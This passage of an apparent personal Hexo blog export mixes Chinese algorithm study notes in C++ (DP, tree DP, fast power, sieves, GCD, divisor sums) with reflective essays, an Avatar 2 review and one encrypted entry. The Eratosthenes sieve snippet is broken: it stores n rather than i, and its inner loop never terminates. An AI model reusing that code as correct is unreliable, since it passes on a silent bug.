class="built_in">size</span>();j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;state.<span class="built_in">size</span>();k++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> u=<span class="number">0</span>;u&lt;state.<span class="built_in">size</span>();u++)&#123;<span class="comment">//从上到下为第i,i-1,i-2;行</span></span><br><span class="line">                <span class="type">int</span> a=state[j],b=state[k],c=state[u];<span class="comment">//简化计算</span></span><br><span class="line">                <span class="keyword">if</span>((a&amp;b)|(a&amp;c)|(b&amp;c))<span class="keyword">continue</span>;<span class="comment">//相冲突排除</span></span><br><span class="line">                <span class="keyword">if</span>((a&amp;g[i])|(b&amp;g[i<span class="number">-1</span>]))<span class="keyword">continue</span>;<span class="comment">//从i-1次向i次转移,都要不在高地上</span></span><br><span class="line">                f[i&amp;<span class="number">1</span>][j][k]=<span class="built_in">max</span>(f[i&amp;<span class="number">1</span>][j][k],f[(i<span class="number">-1</span>)&amp;<span class="number">1</span>][k][u]+cnt[a]);<span class="comment">//去&amp;,每次只用到2维,虽然要考虑第三维,但在dp方程中不用,所以节省空间滚动掉</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   cout&lt;&lt;f[(n+<span class="number">2</span>)&amp;<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>];<span class="comment">//第n+2行为0,n+1行也为0,所以得到的是的n行的最大情况</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="树形DP"><a href="#树形DP" class="headerlink" title="树形DP"></a>树形DP</h2><p>没有上司的舞会</p>
<p>状态表示有两个,分为dp[u,0],dp[u,1],分别指,在以u为根的tree中选,并且(不选&#x2F;选)u的最大快乐值<br>值的属性是: max </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">6010</span>;</span><br><span class="line"><span class="type">int</span> happy[N];</span><br><span class="line"><span class="type">int</span> e[N], ne[N], h[N], idx;</span><br><span class="line"><span class="type">bool</span> has_father[N];</span><br><span class="line"><span class="type">int</span> dp[N][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    dp[u][<span class="number">1</span>] = happy[u];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>;i=ne[i])&#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="built_in">dfs</span>(j);</span><br><span class="line">        dp[u][<span class="number">0</span>] += <span class="built_in">max</span>(dp[j][<span class="number">0</span>], dp[j][<span class="number">1</span>]);</span><br><span class="line">        dp[u][<span class="number">1</span>] += dp[j][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        cin &gt;&gt; happy[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a, b;</span><br><span class="line">            cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">            has_father[a] = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">add</span>(b, a);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">int</span> root = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(has_father[root])</span><br><span class="line">        root++;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    cout &lt;&lt; <span class="built_in">max</span>(dp[root][<span class="number">1</span>], dp[root][<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="记忆化搜索"><a href="#记忆化搜索" class="headerlink" title="记忆化搜索"></a>记忆化搜索</h2><p>记忆化搜索是dp的一种实现方式(但注意递归的层数过多可能会暴栈)<br>采取递归的方式构成循环,模板题洛谷<a href="https://www.luogu.com.cn/problem/P1434">p1434滑雪</a> </p>
<h1 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h1><h2 id="数学快速幂"><a href="#数学快速幂" class="headerlink" title="数学快速幂"></a>数学快速幂</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qpow</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (b) &#123;</span><br><span class="line">		<span class="keyword">if</span> (b &amp; <span class="number">1</span>) </span><br><span class="line">			ans = ans * a;</span><br><span class="line">	    a *= a;</span><br><span class="line">		b &gt;&gt;= <span class="number">1</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">qpow</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="筛质数"><a href="#筛质数" class="headerlink" title="筛质数"></a>筛质数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> p[N], cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;<span class="comment">//埃氏筛</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!st[i]) &#123;</span><br><span class="line">			p[cnt++] = n;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = i + i; i &lt;= n; j +=i)st[j] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;<span class="comment">//线性筛</span></span><br><span class="line">	<span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!st[i])p[cnt++] = i;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; p[j] &lt;= n / i; j++) &#123;</span><br><span class="line">			st[p[j] * i] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">if</span> (i % p[j] == <span class="number">0</span>)<span class="keyword">break</span>;<span class="comment">//p[j]一定是i的最小质因子</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最大公约数欧几里得GCD"><a href="#最大公约数欧几里得GCD" class="headerlink" title="最大公约数欧几里得GCD"></a>最大公约数欧几里得GCD</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;<span class="comment">//输入时,b&gt;a</span></span><br><span class="line">	<span class="keyword">return</span> b ? <span class="built_in">gcd</span>(b, a % b) : a;<span class="comment">//如果b不是0，返回(b, a % b)，如果b是0，返回a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="求约数个数，求约数之和"><a href="#求约数个数，求约数之和" class="headerlink" title="求约数个数，求约数之和"></a>求约数个数，求约数之和</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给定n个正整数，输出这些数字乘积的约数个数，答案对1e9+7取模</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	unordered_map&lt;<span class="type">int</span>, <span class="type">int</span> &gt; primes;</span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		cin &gt;&gt; x;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i++) &#123;</span><br><span class="line">			<span class="keyword">while</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">				primes[i]++;</span><br><span class="line">				x /= i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x &gt; <span class="number">1</span>)primes[x]++;</span><br><span class="line">	&#125;</span><br><span class="line">	ll res = <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//for (auto tt : primes)res = res * (tt.second + 1) % mod;//求约数的个数</span></span><br><span class="line">	<span class="comment">//求约数之和</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> tt : primes) &#123;</span><br><span class="line">		<span class="type">int</span> p = tt.first, a = tt.second;</span><br><span class="line">		ll t = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (a--)t = (t * p + <span class="number">1</span>) % mod;</span><br><span class="line">		res = res * t % mod;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="欧拉函数-euler-function"><a href="#欧拉函数-euler-function" class="headerlink" title="欧拉函数(euler function )"></a>欧拉函数(euler function )</h2><p>旨在求出一个数n的1-n中与n互质的数的个数<br>1.首先从1-N中去掉p1,p2,….pk的所有的倍数 2.加上所有pi*pj的倍数,因为减重复了 3.减去所有pi*pj*pk的倍数……(利用的是容斥原理)<br><strong>时间复杂度</strong>根号n分解质因数的时间复杂度是根号n</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】人之所向</title>
    <url>/PASTFUTURE/communication/2023/12/12/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p>对人为何，何为人的思考每每绊人心，十余年来不得明了，或许也是，毕竟文人墨客千百余年朝天发问，也只落得一个无病呻吟的恶名，但呀，人不总是这样，总想一抒己见，以表情感。</p>
</blockquote>
<h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>人的目的是什么？一个人活着是为了什么？你学习是为了什么？抛去那些莫须有的，自我欺骗的借口<del>考研，考公，绩点</del>，我只想问，一个人该干什么？还是说人之所以为人就在于他可以自由的支配自己的生活，自由的承担选择的后果，也自由的后悔。</p>
<h3 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h3><p>何为态度？如何的态度才是正确的？</p>
<p>这几日军训。主打一个锻炼集体意识，锻炼记录，锻炼团队，但教官是很人性化的，知道学生需要什么，不需要什么，就像是一场贸易，双方都知道其所需，可见生活的不同阶段，不同经历，都需要不同的态度，当然，这些态度也可以抽象化，以认真，遵守，概括一切，但这未免太过于敷衍且不切合实际了，但深究起来又会无趣无味。</p>
<p>当然，大脑思绪混乱，吾到至今也未曾想好怎么回答这个问题，从小便接触我是谁，我在哪，我要去哪这个问题，到之后开始探讨最完美的死亡方式，掌控死亡，突然有个荒诞的念想，完美的死亡不就是活着么，想活着所经受的压力，困苦实在是太多太多，死了一了百了，生不带来，死不带去，但活着才能感受痛苦，从心理到生理，当然也能收获温暖，快乐，和幸福。</p>
<h4 id="惰性"><a href="#惰性" class="headerlink" title="惰性"></a>惰性</h4><p>人是有惰性的,自我感觉人总会潜移默化的被他人所影响和改变,具体体现在自己的口头禅,说话风格的一些细小的改变,对人处事态度的细小变化,还有思想行为习惯的重点变化,但是呀,当一个人脱离熟悉的环境太久,或者是换到了另一个熟悉的环境,脱离了那群互相影响的人之后,那与生俱来,或者说是存在了太久的思想惯性—惰性便会主导你的行为,让你能够有勇气在床上躺到中午,让你有勇气在床上玩手机玩到凌晨,让你有勇气在打破自己的所有计划,让你有勇气和曾经的进化说ByeBye,人,是复杂的,离谱的,不受控的.</p>
<p>当然,也有可能是我的改变不够深刻,那巨大的思维惯性始终在引导我往我理性的反方向前进,<strong>革命之路,任重道远</strong>.</p>
<h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote>
<p>保持思考，保持敬畏</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>人</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】人际关系</title>
    <url>/PASTFUTURE/human/2024/02/14/</url>
    <content><![CDATA[<blockquote>
<p>人是社会性的动物,总需要群体的生活,自古以来都是这样,只不过是从一群大猩猩”进化”成为一群占地为王,占山为王,掠夺经济,资源,的新人类罢了,站上了食物链的顶端.对于社会的联系也在加强,联系的方式也在变化.</p>
</blockquote>
<h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>近几日过年自然走访亲戚,19,20岁的我还是何14,5岁没啥区别,认不清人,包括且不限于四五个姑姑,堂姐,表格,叔叔,伯伯,舅公.感觉他们之所以在年轻时能发展处如此紧密的关系网,主要是以地缘关系为桥梁,以血缘关系为紧密的纽带而联系起来,毕竟一个邻居家的爷爷就有三个儿子,每个儿子又有儿女开枝散叶,便形成了如此恐怖的关系网,我反正没理明白.</p>
<p>然后我便意识到,每个人都逃不掉走亲访友的局面<del>也可能有例外</del>,为了在几十年后我年老后或者说当我要作为主事人去发红包时,我应该要认得大家,于是我可以的留意了同辈,这是比较好接触的,至目前为止(初六),也算是结束过年,准备回广州</p>
<h1 id="终止-00后"><a href="#终止-00后" class="headerlink" title="终止?00后?"></a>终止?00后?</h1><p>会想,走亲访友这个习俗会不会在00后这里终结?</p>
<blockquote>
<p>个体更倾向于信任那些经常出现在自己生活中的人，常年不见的亲戚因时空疏离，又因城市化分工带来的差异，让价值观、态度立场难以重合，以至于“无法深聊”“共同话题不多”。</p>
<p align="right">摘自<<澎湃新闻网>></p>
</blockquote>
<p>熟悉的陌生人,地缘关系的隔离,因为父母而继承的关系私以为都会在这个网络快速发展之中被不在重视,不在特殊化,年轻一代因为网络能认识到更志同道合的朋友,但因父母而继承的关系能有共同话题的年轻一辈真是太少了,自然会以许多借口缘由而放弃社交,因为社交本身就是一件交易,付出你的价值,换取合理的利益,当交易双方不对等时,做不到一味的付出也就造成了交易的终止.</p>
<p>当然也不否认一种可能,就是多年后当年轻一辈变成了老一辈,可能会继承老一辈的思想,可能也会无聊,在不常生活的家乡去找寻昔日的年轻一辈主动进行社交,来抵消自己内心中的空虚和对过年走亲访友的一些道德感.</p>
<h1 id="传承"><a href="#传承" class="headerlink" title="传承?"></a>传承?</h1><p>以前的社会关系,社会环境恶劣,养育后代是为了家族的传承接替,需要时刻保证有壮丁能为了一整个部落抛头颅洒热血.但现在呢?似乎已经发生了根本性变化,平静的,发展的世界已经形成了太久太久,其实也没有很久,只需要两三代就可以淡掉一点战争的痛苦,抱着满怀的希望和信心开展新的生活.在平静的时代,传宗接代,血缘关系淡化,部分人开始思考多元的性,彩虹游行时长发生,可以预见,在没有外部压迫,对传承没有什么需求了,或者说哲学的进步,更多的人开始更加独立,思考的更为全面,有人是想摆烂,有人是就像<code>何以为家</code>中的那样不想让孩子生下来一起受罪.思想在当代更为跃动,颠覆了百年前,千年前的封建传统.</p>
<p>当然也不妨有一个猜测,个人的传承会被集体的传承所替代,有社会统一安排进行生育,以人造子宫,社会抚养中心的方式,中心化传承,不必做到像氪星人那样出生决定一切,那太逻辑了,违背了人性.如此的传承应该是会有更高的效率,更高的上限,或者说是一种容错方式</p>
<blockquote>
<p>以上内容纯属无稽之谈</p>
</blockquote>
<h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote>
<p>愿汝之体恒满精力，愿汝之心恒葆青春。</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>思考</tag>
        <tag>交往</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】浅谈阿凡达2</title>
    <url>/PASTFUTURE/avator/2023/12/14/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>今日，于发呆之中畅想人生，浅浅做了一套四级卷子之后，便查阅起我的电影仓库，恍然间发现，半年多前加入库中的《阿凡达2》竟然迟迟未看，便将其看完，中途及结束有诸多感慨</p>
</blockquote>
<h2 id="大致观感"><a href="#大致观感" class="headerlink" title="大致观感"></a>大致观感</h2><p>初掠此影片，一打眼便是《阿凡达1》的传统风格，色彩绚丽奇幻，特效精美绝伦，确实是一部好莱坞的质量过关的大作，但也仅限如此。</p>
<p>在前半段困惑于其主题：水之道。水在哪？故事情节无非就是天空人再次降临潘多拉，侵占潘多拉，然后主角（已化为阿凡达）带领家庭逃离，对就是逃离。以保护家庭为理由换了一个部落——海部落寻求存亡，然后又发生一把战斗，便草草收场。让我不经怀疑，这废了老大的劲才干掉了天空人的一艘捕猎号，意义何在？保护了家人？自己儿子还死了一个。如果说，导演组没活了下一次可以搞个草之道，沙漠之道，再出一点小怪兽，然后再来一场家庭的戏码，保护家人，和反牌继续打复活赛。这完全的架空世界观可以让这个系列持续的播下去，十年一部就等了个这个纯纯的动效电影，毫无深意或者说是老套的剧情可言，全篇的家庭，族人的情节渲染使得我很难认真的去看这猜的到走向的故事发展<del>本还以为主角会带领图琨进攻人类基地，毕竟在开始确实给了基地一个俯拍的视角，谁知就出现了一下</del>，只能说这部影片浪费了我的三个小时，或者说我已三个小时满足了心中的情怀吧。</p>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>daily</tag>
        <tag>电影</tag>
      </tags>
  </entry>
  <entry>
    <title>日常杂记</title>
    <url>/PASTFUTURE/daily_write/2023/12/09/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="梦里啥都有!" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="7dee96f915cba555c02a327c868406bd7ec7dd6fe0f9feb18ded8accd5a4c8da">402d207441cbcac2f5ec18c1ee8a0da2b277dd23bec14de279fb4df4836627e37776c9b5bc2f2dc1fc178833b24587745bb252d90f3cbd77a8cd9e329b03dd5041967aebf6e52c081bbe6df6ca8d22ebca9a8f6c152f1f361b8699db1279e70260c8952da3d89a02e697abad783d8bd5c3b499bc5308178ad86c209b7896420602a5bd6e79972f0e6cbb227644000868600868bc46b6820cd06931ec52924ba1286698fd83111df5ddc7b07664de43d840e70c739f6cf24d6cec634486f3cae074fed23f757ad4ea369396cc670ea1a57dfcc873fe91cdbb0ac048ca325c3df6e99feb40c0339308baaadca87924dbcb9b276590d6428e6492a358144cecb0a314330ae72b947739cbcfccb44a008071fd188d071e728d3710aad6cc360caab98aaa8138cb20e0c9aaa59dc8ba4f9cb79712ea8c31d3cfd546feb698575e9637e8bbb851ed248c86c5ca175ca8d5bda8e7b20411573ce502062260e31d041b03bdaf975ff511b53f73510870704f074c2023fc42455300c074119e24340aaef6421ae6e98639fd4b4a903b24492d8f2c989c8e6047f094b275e4a75d150afb2386d32487b4f65d8f025f2eb637fe6d61d5d63f528b058988b0a0e2e142ce9ba49b2f477e92b195638da03e22b149b6ebf7b251ccac96647f351dd94a7435ebf3559c412ca50259a67a6e38b3451afaa91abb77b439ec94728be3c06ad4ff6fc0bab02642dd6823cffb0676e6717c529d1106badd739c32ad975f6d278f5c6080bb860d97dc531626426b5c3160948bb8e0b79a2d230d67a011c6603331acc76be31b04498fad6e995316a1f9a2ab31ee13ff1cdadaded4c37486a90ff332c266b5430ca73d3eb0a1e1fe574cd071a893b5ae7f6d4d319b1746a1f947a6b013a70ca472e5f861524f1d536822f0affaa3238064fb4ee0213ef0de28dd7ff1a6c6de677093fe7f6cea3c91e19e13cd7b824cf3bd9ee04cf4c51739089aa734bc635ba6b48779864c65cbaab53160ac315678ba76cda156c79315cd1c481e7cbdafe260e205a2ec8540cfb1844dbe4aa5e0c4012a81e5847c4a16b7996ba2bee007f4a29cfda2c19fb7a184f43dfb945028479d7411b33fc4fb76e9fddde75147e8206e87e0cc2ac16804a033b9ec4a956850ba41722bb59b678c66888d73af16e2b6a63056e12b403d058f6c0b938f4dd360352696ac6fca0dde7a42beb0752e02783696595d20850ec01844b661341d7a7ee6ad02d54a45b3bf4c5e52590ad7a6e081107831ea75ebee9caec128eedb3640034a8a43a4b13342f7e76e68093ee039dd925456d00873c227ccbc38c45d580a4e9b24b6e5e8133542a9547a33ef667974f23ee8c23eac23802b9d158fb7a432ce340e6a3a5416230cb14649e18d18417402e3975b3ce547abf6fb791e27357d876426a8f235220711b88b82d4382b4027b41ad4306a8e497fcb2a9efa16d268fb3f558dd21e44eebf73544d80f6092132b6e0f049fd69fbb8aef9d795b16b4f52ce91c5bb1dbae6b0468e99212d2d44a80fdc0235cad2989e1163d86674e301373e35412f3474c9209cde0bb6a1fd98d0c944e9c9249e6e161bb1455abc816a496782f4c1e8176381e2e374d6da03e11089fa862c4a732c8b3840a4990abb96932b43a40a5e75b4d1c0c6d96380f33dbac445985ce8b68c1a4f7103ae9df04926a40b4de458a6f28e80bd811238c55b80a7377f2294f796276dc0c4f47f4da889d31c160b4958376709ac60739a51c7eb6d82dfef2097d0b34e3a1929be4a6ea57ae91a79a115e6695216e4c72420b1703333133b529bd938c996374d7635642cfd640fbd296427a7f5347b24c3f3ea1aa97a22809486093a4b43187b7760c392f1fd20317df2735e6926e421e595a446382f267a4dc26564ca908d0f7ed35ec9659c099e6a844cece06a27d02538701a88457088968e620bebdd39a318a5c8d955d7f8e4a110ecb80d1a98adf6482707292100015125b4cef4a8f4a1f43be6712c3f59a184beac8f4804c5b5c135bf04a58b49a105d8e5b0469bc29d221f01492777f9210234fe54a68d82717ba793b40857a07dc3ef4bf4db75742138a8482bc8c2b03af120e95458808020de61867cbf7ee66a1ca5f38640335db79086ec42de495a8d7a0682b5bdd0783619d69621a0011ac186155732387803c5c839b818ee3dceb8b1d74b633cb4f0ad49986dac4e3c1d0855aa940f4b92f8c4cc2065d39ae7f34f29c9eb03cbb193f3195ab1d7040183640f6892c94984fbbcff49305df10e44c68855facb46b92be942f7968660c4c5cd8861607947d63bd8a588ebeec71259df020c0052b2d091cbed36919862a196831b1642d913aac0c9daf3f83b6d90a5f2e97b6677818429131925fe1aefbfcf9714c84ccda11a5742ecc0d7e6a9271f47d8b02be5fbdadf8ea29c1898d176fd31185592478119d9672dc5d2084024203276390abe3dab9b37696d875451a8268305db7ce3cdd680cb1aaeb90295cb0ecace54403f12b2f62732530aa8ccd76df6d1baa52a05b97ca83c16c9928e7e012d90b8fa38ccbcfde62bc8481cfb8b60794ea584016306ca352a2ba272a24de779fa295340739b110235bdc40ecbc34a95277a82fe9aef3c572dddff28fb3ff9c06f5a6dc70eebd1300703421f9439ce062f7c7767284d5ab5c2a261cc058413d69fe8cbd262e426ef7cd15f66c0f0d5b3d183069a911a88ad77fc328cf9f86f190d7e4ca9f7d580f9a7736a1c1cd9bb68a00e260d4665578857744c3bd9fb4c43af950cbbca878b1c5bfce52aa27a5888c99cacee7351b85eab51c45035130e6e8c4ec5a509c1c8def8acabfde806c710f5a8defed98e5da926c3968c9b873886f0ee588440369b3aea99c46c18749e2e8f9e0d116c90fc8f17364b95c817010b44cbfe693364dc109b72a24886e935705584533ae72b590db234e8783734422c8db0fa2578063dbd4b831f476c96754aca040082b18bbb47a1524e63832b7765365ca983cbcaa850eedbd967d812ff1792ed749113810316dd3b0cabfa94b4538d42e73d1cac6833643edf235b1126c46a65c271cd9c0a7e7ade5f756f3c1f6c12de84fec583dc0fc9324faa6bdd55bcb18b67736fb33209ab83970a632c8ad3ca613c68135504e8a0d081cf3c4186d180d968c58e711eb0481b35ae61d0f9d9ff4bc33f2775951122471716aee20c523f33828e21a73530528bfb30353072458ac0a1d2b1640f090d0d2674e68a39cf9a159c11c84435f4f2a86282e1df06835381294a81e5ebe0d203b99594ead9ea45d1807fd954270ff012689f9e2f54564378406d27eda7f213251f4b0d6d4326d88ff6938792ee663c7494501ff46f1b5229ff77f35e46ae98466ed76e45af1558667e7c338c2ebd478b64932a532bc05096ffd29f433ecf0a85e1750840e38894cb3072bc5189e1914f28683306c30d2b6e936a3e3227b3da2e55d22f175c25ba1ead82ca791bc75e4dad5f2077065ff21bb96a9d49b0d2db1b4ce78be7ca0ed40fc04fc3203fdd25b8d895f0407845551e097bd340c3c9fd88bb12421c7548515b2b03caa23c446895bd53f63ec3db5a3ca5553f83af88395d2f537a027eea96ad2ee0497fb767c2f4271424ae07d2fa521b20c716f14bf7ad5777480bdab21e37c20067f943d78a161503a7af7a489ded33809ef7b32f85b406f9250b0cc8b1ebba1a8c247d43043fd43d139d43223d880247d3386261bdd961a960f89b44a6dd513ae89b1c2499c94f8b0ad6f63a14b2d35777e66c7593f96e036e976ecc949633bf3173eda0dc7889ab6334e8e00d7b1391d893e5568a96c602cb99ad250a5bc6a5ab5aefdbbb8445fdc61dec3c2b9a47a355fda77b581972ed9d08598e301eb09056aac177bcea6228f454e583b94d774d3eebcdff08564d64015b9d1912af96fb0bf7eff6231c6339db1a0a520e2d51d6a76d36a441fe89f4a333705b8008396e0f0b59d2785d3bdbdddfa304e47d5376299ba28c45a26febbee0d11c5f4093d7926fb5531b790449eaf7ffbd9baeeb22b4dd274b6e6991d2cc153389e5ce3306468580e854a386bf3a16e2fa7b96976c4d52326f4b54770ff9fb45049b9e72881c0573de38c1854747283462d86ec7882c5c54c4aa087069fc3d1c405cb1d6f83921279f3df8313f0ae0fc1f7270c592952120d0d69fc5264522ba2202b03edde6743886608a332a6516da8b032fe21b6a38d508c1b5668d9cd3052a607c2f34e765e9547efc9c33fd2791a4619e80b4a90060f8b288ae846b1f7c3189627de074e7c4e2a3d9326512bcf1386f993b1f352e10590ef1709b452ced2b99aca34831648de7bfb1c48b4b547391617c0dc2f86a35f15c597bd066810d8debdba66cefa18980f983f581ead7de8b01a08675f96406b299eaf3857c3c7c24f3121066db2189ceb8d4c6d708804cbf91f455579863493b0d4bbcece4f3411590e241573edcaf5e45e64373181fa3f9550958a0c3498671a78f9d2628fd774583e1e3de22de860f9076a8dab3cfb47ab56bd33bd864abb1121b20cf9558c9e6834e7c95b135499bd6ea78cbdacdd162b54b090e07fee5de871a500931c4084f05e4923fc65046bd575e49b762e04400e289cac1179a37733644853f25615883cac2fd32f0950aca61cfe059e2106839df54aefaf092da910eaebe58d62049567632f091b9c1c0780c56c799a816b179a49ab0d56e9115094e815168d4004704ed988e4a21b533bc89aeeed138bceb845bd261e43a908bb1d984e20185fad56743b3c0178c7f57728ab906b2598590611d885c76a43bde1dbf927efdfd0958c7b2a5388cbba61e8050fc6ac32f94cb8ffef8fcdd1537ce65e419dc251b2b3a29777271b219b174eb8a1d944907c0d3d0ba70b6910f4f93449b658f1a323631a699022ac8d8ec53974c40f96cd9ce24343fbc822a9c68107cd9e553c1326a2919be63f7843c1d1434ded80d3b436f4876bee6f22e1f14afd2507d53612033827a06be61588d97beef0840c86b0b16d3e4fdc2bc52f2740334e5eb9c6ee61ab0f2644facd1a456c225c134892c69f83628df5b2accdd0d18cb9cdc14166fe0a84b2b5d9c21c7e7d8711c47070b356331159ff88b6e1ac689d4a9354495cb5e9546044458de78a14e1ef89f